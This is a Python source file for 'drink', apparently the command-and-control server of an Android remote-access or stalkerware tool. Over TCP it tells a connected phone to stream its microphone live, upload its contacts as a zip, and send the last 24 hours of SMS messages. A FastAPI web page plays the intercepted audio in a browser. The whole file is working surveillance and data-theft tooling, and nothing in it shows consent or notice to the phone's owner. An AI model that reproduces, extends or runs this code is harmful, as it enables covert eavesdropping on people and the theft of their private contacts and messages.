import asyncio
import json
import os
import struct
import sys
import threading
from pathlib import Path
from typing import Optional, Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse

TCP_HOST = "192.168.1.149"
TCP_PORT = 33110
WEB_PORT = 3000

app = FastAPI()

state = {
    "tcp_server": None,
    "client_reader": None,
    "client_writer": None,
    "client_addr": None,
    "listening": False,
    "mic_active": False,
}

audio_clients: Set[WebSocket] = set()
loop: asyncio.AbstractEventLoop = None


HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>drink — mic stream</title>
<style>
  body { background: #111; color: #eee; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
  h1 { font-size: 1.4rem; margin-bottom: 1rem; }
  #status { font-size: 0.9rem; color: #888; }
</style>
</head>
<body>
<h1>drink — mic stream</h1>
<p id="status">connecting…</p>
<script>
(function () {
  const status = document.getElementById('status');
  const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
  const ws = new WebSocket('ws://' + location.hostname + ':3000/ws/audio');
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => { status.textContent = 'connected — waiting for audio'; };
  ws.onclose = () => { status.textContent = 'disconnected'; };
  ws.onerror = () => { status.textContent = 'error'; };

  let nextTime = 0;

  ws.onmessage = (event) => {
    const pcm = new Int16Array(event.data);
    const float32 = new Float32Array(pcm.length);
    for (let i = 0; i < pcm.length; i++) {
      float32[i] = pcm[i] / 32768.0;
    }
    const buffer = ctx.createBuffer(1, float32.length, 16000);
    buffer.copyToChannel(float32, 0);
    const source = ctx.createBufferSource();
    source.buffer = buffer;
    source.connect(ctx.destination);
    const now = ctx.currentTime;
    const startAt = Math.max(now, nextTime);
    source.start(startAt);
    nextTime = startAt + buffer.duration;
    status.textContent = 'streaming ▶';
  };
})();
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_PAGE


@app.websocket("/ws/audio")
async def ws_audio(websocket: WebSocket):
    await websocket.accept()
    audio_clients.add(websocket)
    try:
        while True:
            await websocket.receive_bytes()
    except WebSocketDisconnect:
        pass
    finally:
        audio_clients.discard(websocket)


async def broadcast_audio(chunk: bytes):
    dead = set()
    for ws in audio_clients:
        try:
            await ws.send_bytes(chunk)
        except Exception:
            dead.add(ws)
    audio_clients.difference_update(dead)


async def send_frame(writer: asyncio.StreamWriter, payload: bytes):
    header = struct.pack(">I", len(payload))
    writer.write(header + payload)
    await writer.drain()


async def recv_frame(reader: asyncio.StreamReader) -> bytes:
    raw_len = await reader.readexactly(4)
    length = struct.unpack(">I", raw_len)[0]
    return await reader.readexactly(length)


async def send_command(cmd: dict):
    writer = state["client_writer"]
    if writer is None:
        print("no client connected")
        return
    await send_frame(writer, json.dumps(cmd).encode())


def client_connected() -> bool:
    return state["client_writer"] is not None


def clear_client():
    state["client_reader"] = None
    state["client_writer"] = None
    state["client_addr"] = None
    state["mic_active"] = False


async def handle_mic_stream(reader: asyncio.StreamReader):
    state["mic_active"] = True
    print("\n[mic] streaming started — open http://localhost:3000 to listen")
    try:
        while state["mic_active"] and state["client_writer"] is not None:
            try:
                header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=5.0)
            except asyncio.TimeoutError:
                continue
            header = json.loads(header_bytes.decode())
            if header.get("type") != "mic_chunk":
                break
            audio_data = await recv_frame(reader)
            await broadcast_audio(audio_data)
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    finally:
        state["mic_active"] = False
        print("\n[mic] stream ended")
        print("drink> ", end="", flush=True)


async def handle_contacts(reader: asyncio.StreamReader):
    header_bytes = await recv_frame(reader)
    header = json.loads(header_bytes.decode())
    if header.get("type") != "contacts":
        print("unexpected response type")
        return
    data = await recv_frame(reader)
    dest = Path.home() / "Desktop" / "contacts.zip"
    dest.write_bytes(data)
    print(f"[contacts] saved {len(data)} bytes → {dest}")


async def handle_sms(reader: asyncio.StreamReader):
    header_bytes = await recv_frame(reader)
    header = json.loads(header_bytes.decode())
    if header.get("type") != "sms":
        print("unexpected response type")
        return
    messages = header.get("data", [])
    print(f"\n[sms] {len(messages)} messages (last 24h):")
    for msg in messages:
        addr = msg.get("address", "?")
        body = msg.get("body", "")
        ts = msg.get("date", "")
        direction = "▼" if msg.get("type") == 1 else "▲"
        print(f"  {direction} [{ts}] {addr}: {body}")
    if not messages:
        print("  (none)")


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info("peername")
    state["client_reader"] = reader
    state["client_writer"] = writer
    state["client_addr"] = addr
    print(f"\n[+] client connected from {addr}")
    print("drink> ", end="", flush=True)
    try:
        await asyncio.Event().wait()
    except Exception:
        pass


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    if client_connected():
        writer.close()
        await writer.wait_closed()
        return
    await client_session(reader, writer)


async def start_tcp_server():
    server = await asyncio.start_server(tcp_client_handler, TCP_HOST, TCP_PORT)
    state["tcp_server"] = server
    state["listening"] = True
    print(f"[*] listening on {TCP_HOST}:{TCP_PORT}")
    async with server:
        await server.serve_forever()


async def stop_tcp_server():
    server = state["tcp_server"]
    if server:
        server.close()
        await server.wait_closed()
        state["tcp_server"] = None
        state["listening"] = False
    if state["client_writer"]:
        state["client_writer"].close()
        try:
            await state["client_writer"].wait_closed()
        except Exception:
            pass
        clear_client()
    print("[*] TCP server stopped")


async def cmd_disconnect():
    if not client_connected():
        print("no client connected")
        return
    await send_command({"cmd": "disconnect"})
    state["client_writer"].close()
    try:
        await state["client_writer"].wait_closed()
    except Exception:
        pass
    clear_client()
    print("[*] client disconnected")


async def cmd_use_mic():
    if not client_connected():
        print("no client connected")
        return
    if state["mic_active"]:
        print("mic already active")
        return
    await send_command({"cmd": "use_mic"})
    reader = state["client_reader"]
    asyncio.get_event_loop().create_task(handle_mic_stream(reader))


async def cmd_get_contacts():
    if not client_connected():
        print("no client connected")
        return
    await send_command({"cmd": "get_contacts"})
    reader = state["client_reader"]
    await handle_contacts(reader)


async def cmd_get_sms():
    if not client_connected():
        print("no client connected")
        return
    await send_command({"cmd": "get_sms"})
    reader = state["client_reader"]
    await handle_sms(reader)


def print_help(post_start: bool = False, post_connect: bool = False):
    if not post_start:
        print("  /start       start listening for TCP connections")
        print("  /quit        exit")
        return
    if not post_connect:
        print("  /stop        stop listening")
        print("  /quit        exit")
        print("  (waiting for client…)")
        return
    print("  /disconnect  disconnect the Android client")
    print("  /use mic     start mic audio stream")
    print("  /get contacts  download contacts.zip to Desktop")
    print("  /get sms     fetch last 24h SMS messages")
    print("  /stop        stop server and disconnect client")
    print("  /quit        exit")


async def shell_loop():
    executor_loop = asyncio.get_event_loop()

    def read_line():
        sys.stdout.write("drink> ")
        sys.stdout.flush()
        return sys.stdin.readline()

    while True:
        line = await executor_loop.run_in_executor(None, read_line)
        line = line.strip()
        if not line:
            continue

        if line == "/quit":
            print("bye.")
            os._exit(0)

        if line == "/start":
            if state["listening"]:
                print("already listening")
            else:
                executor_loop.create_task(start_tcp_server())
            continue

        if line == "/stop":
            if not state["listening"]:
                print("not listening")
            else:
                await stop_tcp_server()
            continue

        if line == "/disconnect":
            await cmd_disconnect()
            continue

        if line == "/use mic":
            await cmd_use_mic()
            continue

        if line == "/get contacts":
            await cmd_get_contacts()
            continue

        if line == "/get sms":
            await cmd_get_sms()
            continue

        if line == "/help":
            print_help(state["listening"], client_connected())
            continue

        print(f"unknown command: {line!r}  (type /help)")


def start_uvicorn():
    config = uvicorn.Config(app, host="0.0.0.0", port=WEB_PORT, log_level="warning")
    server = uvicorn.Server(config)
    server.run()


async def main():
    global loop
    loop = asyncio.get_event_loop()

    web_thread = threading.Thread(target=start_uvicorn, daemon=True)
    web_thread.start()

    print(f"drink server — web UI at http://localhost:{WEB_PORT}")
    print("type /help for commands")

    await shell_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nbye.")
